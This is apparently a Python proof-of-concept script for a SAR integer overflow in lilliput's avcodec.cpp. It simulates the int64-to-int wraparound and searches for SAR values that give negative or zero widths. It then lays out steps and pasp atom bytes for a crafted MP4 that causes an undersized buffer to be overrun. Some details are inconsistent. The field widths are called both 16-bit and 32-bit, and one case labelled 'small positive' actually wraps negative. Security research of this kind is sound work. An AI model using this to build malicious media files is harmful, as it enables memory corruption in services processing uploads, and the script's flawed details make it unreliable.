#!/usr/bin/env python3
"""
Analysis tool: avcodec SAR integer overflow in lilliput avcodec.cpp

Demonstrates the integer overflow calculation for various SAR values.
A crafted MP4/MOV with extreme SAR values triggers the overflow.

The actual MP4 construction requires a valid H.264 bitstream (omitted here),
but this script shows the overflow conditions and expected behavior.

Usage:
    python3 craft_mp4_sar_overflow.py
"""

import ctypes
import struct


def simulate_overflow(codec_width, sar_num, sar_den):
    """
    Simulate avcodec_decoder_get_width() C behavior.
    Returns (int64_intermediate, int_result, overflowed)
    """
    # C: (int64_t)codec_width * sar_num / sar_den
    intermediate_i64 = codec_width * sar_num // sar_den
    
    # Cast to C int (32-bit signed, wrapping overflow)
    result_int = ctypes.c_int32(intermediate_i64).value
    
    overflowed = (intermediate_i64 != result_int)
    return intermediate_i64, result_int, overflowed


def main():
    print("=== avcodec SAR Integer Overflow Analysis ===\n")
    print("Bug: return (int64_t)d->codec->width * sar.num / sar.den;")
    print("     The int64_t result is implicitly narrowed to int\n")
    
    print(f"{'codec_w':>10} {'sar_num':>10} {'sar_den':>10} {'int64_result':>15} {'int_result':>12} {'overflow':>10}")
    print("-" * 75)
    
    test_cases = [
        # Normal cases
        (1920, 1, 1, "normal 1:1 SAR"),
        (1920, 4, 3, "normal 4:3 SAR"),
        # Edge cases that overflow
        (32767, 65535, 1,   "large codec_w + large sar_num"),
        (16384, 65535, 1,   "medium codec_w + max sar_num"),
        (65535, 32768, 1,   "large codec_w + half-max sar"),
        (1920,  2236961, 1, "target overflow: approx 2^31 / 1920"),
        (1280,  1677722, 1, "target overflow: approx 2^31 / 1280"),
        (3840,  559241,  1, "4K with extreme SAR"),
        # Specific overflow to small value
        (1920,  1119553, 1, "overflow to small positive"),
    ]
    
    for codec_w, sar_num, sar_den, description in test_cases:
        # Only test cases where sar_num > sar_den (the condition in lilliput)
        if sar_num <= sar_den:
            continue
        
        i64, i32, overflowed = simulate_overflow(codec_w, sar_num, sar_den)
        marker = " *** OVERFLOW" if overflowed else ""
        print(f"{codec_w:>10} {sar_num:>10} {sar_den:>10} {i64:>15,} {i32:>12,} {str(overflowed):>10} {description}")
    
    print("\n--- Finding specific overflow to negative value ---")
    # Brute force: find SAR.num that causes overflow to negative
    codec_w = 1920
    for sar_num in range(1_000_000, 2_000_000, 1000):
        sar_den = 1
        i64, i32, overflowed = simulate_overflow(codec_w, sar_num, sar_den)
        if overflowed and i32 < 0:
            print(f"codec_w={codec_w}, sar_num={sar_num}, sar_den={sar_den}")
            print(f"  int64 result: {i64:,}")
            print(f"  int32 result: {i32:,} (NEGATIVE!)")
            print(f"  This would cause downstream buffer allocation with negative dimension")
            break
    
    print("\n--- Finding overflow to zero ---")
    codec_w = 1920
    for sar_num in range(1_000_000, 4_000_000, 1):
        sar_den = 1
        i64, i32, overflowed = simulate_overflow(codec_w, sar_num, sar_den)
        if overflowed and i32 == 0:
            print(f"codec_w={codec_w}, sar_num={sar_num}, sar_den={sar_den}")
            print(f"  int64 result: {i64:,}")
            print(f"  int32 result: {i32} (ZERO!)")
            print(f"  A zero-width dimension would cause a zero-size allocation")
            break
    else:
        print("  No exact zero overflow found in range")
    
    print("\n--- MP4 Attack Vector ---")
    print("""
To exploit this in practice:
1. Craft an MP4 with H.264 video at 1920x1080
2. Set the pasp (pixel aspect ratio) box in the stsd/avc1 atom:
   - hSpacing (16-bit): set to overflow value (e.g., 1119553 -- but pasp is 32-bit)
   - vSpacing (16-bit): normal value
3. lilliput's avcodec_decoder_get_width() will compute:
   (int64_t)1920 * hSpacing / vSpacing
   which overflows to a negative or small value
4. The Go caller uses this dimension to allocate the output OpenCV matrix
5. sws_scale() then writes full-resolution data into the undersized buffer

Note: pasp atom fields are 32-bit unsigned in MP4, so they can encode
values up to 4,294,967,295 — easily sufficient to trigger the overflow.

Sample pasp atom bytes for sar_num=2236962, sar_den=1:
""")
    sar_num = 2236962
    sar_den = 1
    pasp = struct.pack('>I', 12)     # atom size
    pasp += b'pasp'
    pasp += struct.pack('>I', sar_num)
    pasp += struct.pack('>I', sar_den)
    print(f"  pasp atom: {pasp.hex()}")
    print(f"  This encodes SAR {sar_num}:{sar_den}")
    i64, i32, ov = simulate_overflow(1920, sar_num, sar_den)
    print(f"  Effect on 1920-wide codec: int64={i64:,}, int32={i32:,}, overflow={ov}")


if __name__ == '__main__':
    main()
